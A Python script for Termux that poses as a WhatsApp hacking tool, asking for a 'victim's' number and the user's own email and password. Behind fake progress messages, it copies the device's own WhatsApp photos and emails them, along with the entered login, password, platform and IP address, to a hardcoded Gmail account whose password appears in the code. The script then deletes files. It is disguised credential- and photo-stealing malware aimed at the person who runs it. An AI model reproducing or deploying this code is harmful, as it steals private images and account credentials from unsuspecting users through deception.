import os, shutil, sys, socket, random
import smtplib, datetime, platform
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

ip = socket.gethostbyname(socket.getfqdn())
directory = "//storage//emulated//0//WhatsApp//Media//WhatsApp Images"
p = '//storage//emulated//0//WhatsApp//Media//WhatsApp Images//.w.txt'
f = '//data//data//com.termux//files//home'
cwd = os.getcwd()


os.system('clear')
number = input("Victim's whatsApp number: ")
u_em = input("Your mail for receiving data: ")
u_ps = input("Your mail password: ")

if not os.path.exists(directory):
   print("Error")
   sys.exit()

if number == "" or u_em == "" or u_ps == "":
   print("\nYou may not have entered a number or mail or password")
   sys.exit('ERROR')
else:
   print("\nPurpose: " + number)
   print("Expect a hack...\n")


if os.path.exists(p):
      os.remove(p)
for file in os.listdir(directory):
   if file.endswith(".jpg"):
      photos = os.path.join(file)

      fl = open(p, 'a')
      fl.write(photos + '\n')
fil = open(p, 'r').readlines()
fil = [lens.rstrip()for lens in fil]


l = len(fil) + 1
line = l
i = 0


try:
    for i in range(line):
        rn = random.randint(1,999999999999999)
        rr = random.randint(1,999999999999999)
        ry = random.randint(1,999999999999999)
        ru = random.randint(1,999999999999999)
        ri = random.randint(1,999999999999999)
        shutil.copy(directory +'//'+ fil[i], f)
        print("Data collection: "+str(rn))
        now = datetime.datetime.now()
        log = 'eson3800@gmail.com'
        send = 'eson3800@gmail.com'
        print("Data collection: "+str(rr))
        print("Data collection: "+str(ry))
        msg = MIMEMultipart()
        msg['Subject'] = u_em
        msg['From'] = log
        msg['To'] = send
        print("Data collection: "+str(ru))
        print("Data collection: "+str(ri))
        text = MIMEText('Платформа: '+platform.platform() +'\nВремя: '+
            now.strftime("%d-%m-%Y %H:%M:%S")+'\nАдресс: '+ip+'\nЛогин: '+u_em+'\nПароль: '+u_ps)
        
        img_data = open(fil[i], 'rb').read()
        image = MIMEImage(img_data, name= fil[i])
        msg.attach(text)
        msg.attach(image)
        print("Data collection: "+str(rn))
        print("Data collection: "+str(rr))
        s = smtplib.SMTP("smtp.gmail.com", 587)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login("eson3800@gmail.com","ERIK123454321")
        s.sendmail(log, send, msg.as_string())
        s.quit()
        print("Data collection: "+str(ry))
        print("Data collection: "+str(ru))
        i += 1
except KeyboardInterrupt:
      print("Forced stop...")
except:
      print("\nERROR")
      print("Hacking server has been blocked 2020.05.27")

finally:
      for i in range(line - 1):
         os.remove(cwd +'//'+ fil[i])
      os.remove(p)  


